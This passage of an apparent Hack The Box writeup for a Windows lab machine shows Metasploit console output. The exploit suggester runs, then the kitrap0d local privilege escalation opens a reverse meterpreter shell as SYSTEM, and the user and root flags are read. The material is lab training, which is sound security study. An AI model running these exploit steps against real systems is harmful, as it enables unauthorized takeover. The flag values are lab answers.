+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 0, use <span style="color:#ae81ff">0</span> or use post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; use suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                      Disclosure Date  Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                      ---------------  ----    -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 0, use <span style="color:#ae81ff">0</span> or use post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>post/multi/recon/local_exploit_suggester<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name             Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----             ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   SESSION                           yes       The session to run this module on
+</span></span><span style="display:flex;"><span>   SHOWDESCRIPTION  false            yes       Displays a detailed description <span style="color:#66d9ef">for</span> the available exploits
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; sessions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type                     Information              Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----                     -----------              ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span>         meterpreter x86/windows  IIS APPPOOL<span style="color:#ae81ff">\W</span>eb @ DEVEL  10.10.14.104:1234 -&gt; 10.10.10.5:49349 <span style="color:#f92672">(</span>10.10.10.5<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set session <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.5 - Collecting local exploits <span style="color:#66d9ef">for</span> x86/windows...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.5 - <span style="color:#ae81ff">186</span> exploit checks are being tried...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running check method <span style="color:#66d9ef">for</span> exploit <span style="color:#ae81ff">41</span> / <span style="color:#ae81ff">41</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.5 - Valid modules <span style="color:#66d9ef">for</span> session 2:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#   Name                                                           Potentially Vulnerable?  Check Result</span>
+</span></span><span style="display:flex;"><span> -   ----                                                           -----------------------  ------------
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span>   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">8</span>   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">9</span>   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">10</span>  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">11</span>  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">12</span>  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">13</span>  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">14</span>  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">15</span>  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">16</span>  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">17</span>  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">18</span>  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">19</span>  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">20</span>  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">21</span>  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">22</span>  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">23</span>  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">24</span>  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">25</span>  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">26</span>  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">27</span>  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">28</span>  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">29</span>  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">30</span>  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">31</span>  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">32</span>  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">33</span>  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">34</span>  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">35</span>  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">36</span>  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">37</span>  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">38</span>  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">39</span>  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">40</span>  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">41</span>  exploit/windows/local/webexec                                  No                       The check raised an exception.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed
+</span></span></code></pre></div><p>I use this module <code>exploit/windows/local/ms10_015_kitrap0d</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; use exploit/windows/local/ms10_015_kitrap0d 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; set session <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.0.2.15:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting payload and triggering the bug...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching msiexec to host the DLL...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Process <span style="color:#ae81ff">3160</span> launched.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the DLL into 3160...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit finished, wait <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>hopefully privileged<span style="color:#f92672">)</span> payload execution to complete.
+</span></span><span style="display:flex;"><span>^C<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; set lhost 10.10.14.104
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 10.10.14.104
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; set lport <span style="color:#ae81ff">2345</span>
+</span></span><span style="display:flex;"><span>lport <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">2345</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.104:2345 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting payload and triggering the bug...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching netsh to host the DLL...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Process <span style="color:#ae81ff">2416</span> launched.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the DLL into 2416...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit finished, wait <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>hopefully privileged<span style="color:#f92672">)</span> payload execution to complete.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 10.10.10.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">3</span> opened <span style="color:#f92672">(</span>10.10.14.104:2345 -&gt; 10.10.10.5:49351<span style="color:#f92672">)</span> at 2023-07-18 15:47:30 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div><p>I take the <code>user flag</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;cd ..
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32&gt;cd ..
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\W</span>indows&gt;cd Users
+</span></span><span style="display:flex;"><span>cd Users
+</span></span><span style="display:flex;"><span>The system cannot find the path specified.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\W</span>indows&gt;cd ..
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\&gt;</span>cd Users
+</span></span><span style="display:flex;"><span>cd Users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 137F-3971
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\U</span>sers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>18/03/2017  02:16 ��    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>18/03/2017  02:16 ��    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>18/03/2017  02:16 ��    &lt;DIR&gt;          Administrator
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          babis
+</span></span><span style="display:flex;"><span>18/03/2017  02:06 ��    &lt;DIR&gt;          Classic .NET AppPool
+</span></span><span style="display:flex;"><span>14/07/2009  10:20 ��    &lt;DIR&gt;          Public
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>              <span style="color:#ae81ff">0</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">6</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4.691.140.608 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers&gt;cd babis
+</span></span><span style="display:flex;"><span>cd babis
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>abis&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 137F-3971
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>abis
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Contacts
+</span></span><span style="display:flex;"><span>11/02/2022  04:54 ��    &lt;DIR&gt;          Desktop
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Documents
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Downloads
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Favorites
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Links
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Music
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Pictures
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Saved Games
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Searches
+</span></span><span style="display:flex;"><span>17/03/2017  05:17 ��    &lt;DIR&gt;          Videos
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>              <span style="color:#ae81ff">0</span> bytes
+</span></span><span style="display:flex;"><span>              <span style="color:#ae81ff">13</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4.691.140.608 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>abis&gt;cd Desktop
+</span></span><span style="display:flex;"><span>cd Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>abis<span style="color:#ae81ff">\D</span>esktop&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 137F-3971
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>abis<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>11/02/2022  04:54 ��    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>11/02/2022  04:54 ��    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>18/07/2023  09:19 ��                <span style="color:#ae81ff">34</span> user.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4.691.140.608 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>abis<span style="color:#ae81ff">\D</span>esktop&gt;type user.txt
+</span></span><span style="display:flex;"><span>type user.txt
+</span></span><span style="display:flex;"><span>91477ae53cac8728aa60527f6c85a2b8
+</span></span></code></pre></div><p>I take the <code>root flag</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>abis<span style="color:#ae81ff">\D</span>esktop&gt;cd ..
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>abis&gt;cd ..
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers&gt;cd Administrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>cd Administrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 137F-3971
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>14/01/2021  12:42 ��    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>14/01/2021  12:42 ��    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>18/07/2023  09:19 ��                <span style="color:#ae81ff">34</span> root.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4.691.140.608 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;type root.txt
+</span></span><span style="display:flex;"><span>type root.txt
+</span></span><span style="display:flex;"><span>3f1e6df5c0cd3497fbdeaa80572860e1
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/academy/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB Writeup - Academy (Easy)</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/topology/">
+                <span class="button__text">HTB Writeup - Topology (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
